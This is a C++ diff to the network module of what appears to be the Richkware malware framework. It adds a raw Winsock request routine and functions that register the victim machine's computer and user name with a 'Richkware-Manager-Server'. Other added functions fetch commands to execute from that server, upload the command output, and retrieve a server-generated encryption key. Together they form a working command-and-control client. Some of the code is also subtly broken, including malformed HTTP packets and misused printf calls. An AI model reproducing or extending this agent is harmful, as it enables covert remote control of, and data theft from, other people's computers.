@@ -319,13 +319,16 @@ std::string Network::RawRequest(const std::string &serverAddress, const std::str
     char recvbuf[bufferlength];
     int iResult;
     std::string response;
+    struct sockaddr_in  *sockaddr_ipv4;
+    LPSOCKADDR sockaddr_ip;
+
 
     printf("RawRequest: %s port: %s",serverAddress.c_str(),port.c_str());
 
     //Init Winsock
     iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
     if (iResult != 0){
-        return "Error: WSAStartup";
+        return "[Error: WSAStartup]";
     }
 
     ZeroMemory(&hints, sizeof(hints));
@@ -336,8 +339,10 @@ std::string Network::RawRequest(const std::string &serverAddress, const std::str
     iResult = getaddrinfo(serverAddress.c_str(),port.c_str(),&hints,&result);
     if(iResult != 0){
         WSACleanup();
-        return "Error: getaddrinfo";
+        return "[Error: getaddrinfo]";
     }
+
+    printf("[Successful: getaddrinfo]\n");
 
      // Attempt to connect to an address until one succeeds
     for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
@@ -346,17 +351,23 @@ std::string Network::RawRequest(const std::string &serverAddress, const std::str
         ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
                                ptr->ai_protocol);
         if (ConnectSocket == INVALID_SOCKET) {
-            WSACleanup();
-            return "Error: socket";
-        }
-
-        // Connect to server.
-        iResult = connect(ConnectSocket, ptr->ai_addr, (int) ptr->ai_addrlen);
-        if (iResult == SOCKET_ERROR) {
-            closesocket(ConnectSocket);
-            ConnectSocket = INVALID_SOCKET;
+            printf("[Error: invalid socket]\n");
             continue;
         }
+
+        sockaddr_ipv4 = (struct sockaddr_in *) ptr->ai_addr;
+        printf("[Successful: valid socket created]\n");
+        printf("[Connecting to Server: %s ]\n",inet_ntoa(sockaddr_ipv4->sin_addr));
+        // Connect to server.
+        iResult = connect(ConnectSocket, ptr->ai_addr, (int) ptr->ai_addrlen);
+        
+        if (iResult == SOCKET_ERROR) {
+            closesocket(ConnectSocket);
+            WSACleanup();
+            return "[Error: Connection failed]";
+        }
+
+        printf("[Successful: Connection estalished]\n");
         break;
     }
 
@@ -365,7 +376,15 @@ std::string Network::RawRequest(const std::string &serverAddress, const std::str
 
     if (ConnectSocket == INVALID_SOCKET) {
         WSACleanup();
-        return "Error: connect";
+        return "[Error: no valid socket found]";
+    }
+
+     // Send request
+    iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
+    if (iResult == SOCKET_ERROR) {
+        closesocket(ConnectSocket);
+        WSACleanup();
+        return "[Error: sending request]";    
     }
 
     // Receive until the peer closes the connection
@@ -375,28 +394,195 @@ std::string Network::RawRequest(const std::string &serverAddress, const std::str
             // answer
             response.append(recvbuf);
         } else if (iResult == 0) {
-            // connection closed
+            printf("[connection closed\n]");
+            break;
         } else {
-            // error
+            closesocket(ConnectSocket);
+            
+            WSACleanup();
+            return "[Error: receiving response]"; 
         }
 
     } while (iResult > 0);
 
 
      // shutdown the connection since no more data will be sent
-    iResult = shutdown(ConnectSocket, SD_SEND);
+    iResult=shutdown(ConnectSocket, SD_BOTH);
 
-    if (iResult == SOCKET_ERROR) {
-        closesocket(ConnectSocket);
-        WSACleanup();
-        return "Error: shutdown";
+    if(iResult == 0){
+    closesocket(ConnectSocket);
+    WSACleanup();
+    return response;
     }
-
-    // cleanup
+   
     closesocket(ConnectSocket);
     WSACleanup();
 
     return response;
 
 }
+
+bool Network::UploadInfoToRMS(){
+    return UploadInfoToRMS(serverAddress, port, associatedUser, server.getPort(), encryptionKey, defaultEncryptionKey);
+}
+
+bool Network::UploadInfoToRMS(const std::string &serverAddr, const std::string &port, const std::string &associatedUser, const std::string &serverPort, const std::string &encryptionKey,const std::string &defaultEncryptionKey){
+
+    //Crypto crypto(encryptionKey);
+    std::string name = getenv("COMPUTERNAME");
+    name.append("/");
+    name.append(getenv("USERNAME"));
+    //name = crypto.Encrypt(name,defaultEncryptionKey);
+    /*std::string dataEnc = crypto.Encrypt("{\"serverPort\":\"" +
+                                         serverPort +
+                                         "\",\"associatedUser\":\"" +
+                                         associatedUser +
+                                         "\"}");*/
+
+    std::string packet = "PUT /Richkware-Manager-Server/device?data0=" + name +
+                         "&data=" + "dataEnc" +
+                         "&channel=richkware"
+                         " HTTP/1.1\r\n" +
+                         "Host: " + serverAddr + "\r\n" +
+                         "Connection: close\r\n" +
+                         "\r\n";
+
+    std::string response = RawRequest(serverAddr, port, packet.c_str());
+    if(response.find("Error") != std::string::npos){
+        return false;
+    }
+    return true;                                                         
+}
+
+std::string Network::fetchCommand(const std::string &encryptionKey){
+
+    //Crypto crypto(encryptionKey);
+    std::string device = getenv("COMPUTERNAME");
+    device.append("/");
+    device.append(getenv("USERNAME"));
+
+    std::string packet = "GET /Richkware-Manager-Server/command?data0=" + device + "&data1=agent" + " HTTP/1.1\r\n" + "Host: " + serverAddress + "\r\n" + "Connection: close\r\n" + "\r\n";
+    std::string response = RawRequest(serverAddress,port,packet.c_str());
+
+    /*
+     * JSON format returned by server:
+     * {
+     *     status: "OK",
+     *     statusCode: 1000,
+     *     message: {
+     *         commands: "[encrypted string]"
+     *     }
+     * }
+     *
+     * "encrypted string" is formatted as follows:
+     * "command1##command2##commandN"
+     * */
+
+    printf("Msg received:\n");
+    printf("%s\n",response);
+   //parse msg from server
+   if(response.find("OK") != std::string::npos){
+    std::string delimiter = "\"message\":\"";
+    std::string delimiter2 = "\"";
+
+    size_t pos = 0;
+    std::string token;
+    pos = response.find(delimiter);
+    response.erase(0, pos + delimiter.length());
+
+    std::string token2;
+    pos = response.find(delimiter2);
+    token = response.substr(0,pos);
+    return token; // returns an encrypted string containing the commands to be executed
+   }
+   else{
+    return "";
+   }
+}
+
+bool Network::uploadCommandsOutput(std::string commandsOutput,const std::string &encryptionKey){
+    //Crypto crypto(encryptionKey);
+    std::string device = getenv("COMPUTERNAME");
+    device.append("/");
+    device.append(getenv("USERNAME"));
+
+    std::string srvAddr(serverAddress);
+    std::string prt(port);
+    
+    std::string packet = "POST /Richkware-Manager-Server/command HTTP/1.1\r\n"
+                         "\r\n"
+                         "Content-Type: application/json; charset=utf-8\r\n"
+                        "Host: " + srvAddr + ":" + prt + "\r\n"
+                        "Connection: Close\r\n"
+                        "\r\n"
+                        "{\"device\":\"" + device + "\",\"data\":\"" + commandsOutput + "\"}";
+
+
+    std::string response = RawRequest(serverAddress,port,packet.c_str());
+    printf("Response after CommandsUpload:\n");
+    printf("%s",response);
+    if(response.find("error") != std::string::npos){
+        return false;
+    }
+    
+    return true;                   
+}
+
+
+std::string Network::GetEncryptionKeyFromRMS(){
+    return GetEncryptionKeyFromRMS(serverAddress,port,associatedUser);
+}
+
+std::string Network::GetEncryptionKeyFromRMS(const std::string &serverAddr, const std::string &port, const std::string &associatedUser){
+
+    //Crypto crypto();
+    std::string key;
+
+    // create a database entry into the Richkware-Manager-Server, to obtain the encryption key server-side generated
+    UploadInfoToRMS(serverAddr, port, associatedUser, "none", encryptionKey, encryptionKey);
+
+    // Primary key in RMS database.
+    std::string name = getenv("COMPUTERNAME");
+    name.append("/");
+    name.append(getenv("USERNAME"));
+
+    //std::string nameS = crypto.Encrypt(name);
+
+     std::string packet =    "GET /Richkware-Manager-Server/encryptionKey?id=" + name + "&channel=richkware HTTP/1.1\r\n"
+                             "Host: " + serverAddress + "\r\n" +
+                             "Connection: close\r\n" +
+                             "\r\n";
+
+     key = RawRequest(serverAddress, port, packet.c_str());
+    if (key.find('$') != std::string::npos) {
+    key = key.substr(key.find('$') + 1, (key.find('#') - key.find('$')) - 1);
+    //key = crypto.Decrypt(key);
+    }
+    return key;
+    
+}
+
+
+std::string Network::ResolveAddress(const std::string &address){
+    std::string addressIP;
+    WSADATA wsaData;
+    struct hostent *remoteHost;
+    char *hostname;
+    struct in_addr addr= {};
+    WSAStartup(MAKEWORD(2,2),&wsaData);
+    hostname = (char *)address.c_str();
+    remoteHost = gethostbyname(hostname);
+    if(remoteHost != NULL) {
+        if (remoteHost->h_addrtype == AF_INET){
+            int i = 0;
+            while(remoteHost->h_addr_list[i] != 0){
+                addr.s_addr = *(u_long *)remoteHost->h_addr_list[i++];
+                addressIP = inet_ntoa(addr);
+                break;
+            }
+        }
+    }
+    return addressIP;
+}
+
 
